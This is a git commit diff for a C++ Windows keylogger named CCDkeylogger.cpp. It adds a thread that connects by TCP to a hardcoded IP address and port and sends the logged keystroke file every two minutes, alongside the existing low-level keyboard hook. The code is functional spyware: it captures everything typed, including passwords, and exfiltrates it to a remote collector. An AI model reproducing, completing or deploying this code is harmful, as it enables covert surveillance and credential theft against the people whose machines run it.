3636fc1cb74155ae9338e863466812415cc3d22b
314PiGuy <147645262+314PiGuy@users.noreply.github.com>
2024-05-20 13:43:54 -0400

    more tcp streaming!!!

--- CCDkeylogger.cpp
+++ CCDkeylogger.cpp
@@ -3,10 +3,33 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
+#include <chrono>
+#include <ws2tcpip.h>
+#include <mswsock.h>
+#include <filesystem>
+
 
 using namespace std;
 
 bool shift = false;
+
+const string SERVER_IP = "10.228.162.138";
+const int SERVER_PORT = 1235; 
+
+void sendfile(SOCKET s, const char fname[]){
+    HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
+}
+
+void sendstring(SOCKET s, string k){
+    send(s, k.c_str(), k.length(), 0);
+}
+
+string filesize(const char n[]){
+    filesystem::path p = n;
+    uintmax_t m =  filesystem::file_size(p);
+    return to_string(m);
+}
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
@@ -41,8 +64,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return(CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
-int main()
-{
+void run(){
     // Install the low-level keyboard & mouse hooks
     HHOOK Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
     // Keep this app running until we're told to stop
@@ -53,5 +75,64 @@ int main()
     }
 
     UnhookWindowsHookEx(Kybd);
+}
+
+void send(SOCKET sock){
+    string size = filesize("f.txt");
+    string send = "'keylog\\f.txt'"+size+"b";
+    sendstring(sock, send.c_str());
+    sendfile(sock, "f.txt");
+}
+
+void sender(){
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        cout << "could not initialize winsock" << endl;
+    }
+
+    // Create socket
+    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_fd == INVALID_SOCKET) {
+        cout << "could not make socket" << endl;
+        WSACleanup();
+    }
+
+    // Set up server address
+    sockaddr_in serverAddr{};
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(SERVER_PORT);
+    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
+        cout << "invalid IP." << endl;
+        closesocket(socket_fd);
+        WSACleanup();
+    }
+
+    // Connect to server
+    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        cout << "could not connect to server" << endl;
+        closesocket(socket_fd);
+        WSACleanup();
+    }
+
+    while (true){
+        try{
+            send(socket_fd);
+        } catch(exception e){}
+        this_thread::sleep_until(chrono::system_clock::now()+chrono::minutes(2));
+    }
+
+
+    closesocket(socket_fd);
+    WSACleanup();
+}
+
+int main()
+{
+    thread t = thread(run);
+    thread s = thread(sender);
+    
+    t.join();
+    s.join();
     return 0;
+
 }
